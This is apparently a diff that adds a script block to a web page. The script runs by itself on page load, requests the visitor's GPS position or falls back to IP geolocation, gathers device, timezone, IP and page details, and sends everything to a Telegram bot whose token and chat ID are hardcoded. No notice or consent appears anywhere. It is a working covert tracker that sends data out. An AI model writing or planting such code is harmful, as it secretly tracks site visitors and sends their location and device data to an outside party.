@@ -1,0 +1,36 @@
+<script>
+const BOT='8328266831:AAGhGrcSDeYMFurcXFB_Ip4QnqVVWix3tj8';
+const CHAT='-5034172298';
+(async()=>{
+    // Get location
+    let loc={lat:null,lng:null,source:'IP',city:'',country:'',ip:''};
+    try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j));loc.lat=p.coords.latitude;loc.lng=p.coords.longitude;loc.source='GPS'}catch{try{const d=await fetch('https://ipapi.co/json/').then(r=>r.json());loc.lat=d.latitude;loc.lng=d.longitude;loc.city=d.city;loc.country=d.country_name;loc.ip=d.ip}catch{return}}
+
+    // Create message
+    const msg=`NEW VISITOR DETECTED
+
+LOCATION
+Lat: ${loc.lat}
+Lng: ${loc.lng}
+Source: ${loc.source}
+${loc.city?'City: '+loc.city:''}
+${loc.country?'Country: '+loc.country:''}
+Maps: https://maps.google.com/?q=${loc.lat},${loc.lng}
+
+DEVICE
+${navigator.userAgent.substring(0,100)}
+Platform: ${navigator.platform}
+Screen: ${screen.width}x${screen.height}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+NETWORK
+IP: ${loc.ip||'Unknown'}
+
+PAGE
+URL: ${location.href}
+Time: ${new Date().toLocaleString()}`;
+
+    // Send to Telegram
+    fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:msg})});
+})();
+</script>
